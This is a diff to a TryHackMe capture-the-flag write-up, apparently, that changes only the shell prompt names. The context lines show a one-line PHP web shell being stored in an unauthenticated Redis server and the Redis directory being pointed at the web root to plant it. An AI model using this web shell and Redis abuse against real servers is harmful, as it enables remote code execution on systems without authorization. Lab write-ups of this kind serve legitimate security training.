@@ -71,13 +71,13 @@ So we can see apache default page
 #### Redis 6379
 
 ```bash
-argenestel@parrot  ~/Desktop/tryhackme/res  nano shell.php
-argenestel@parrot  ~/Desktop/tryhackme/res  cat shell.php
+root@parrot  ~/Desktop/tryhackme/res  nano shell.php
+root@parrot  ~/Desktop/tryhackme/res  cat shell.php
 <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
 argenestel@parrot  ~/Desktop/tryhackme/res  cat shell.php | redis-cli -h 10.10.79.132 -x set lkey
 
 OK
-argenestel@parrot  ~/Desktop/tryhackme/res  redis-cli -h 10.10.79.132
+root@parrot  ~/Desktop/tryhackme/res  redis-cli -h 10.10.79.132
 10.10.79.132:6379> get lkey
 "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>\n"
 10.10.79.132:6379> config set dir /var/www/html/
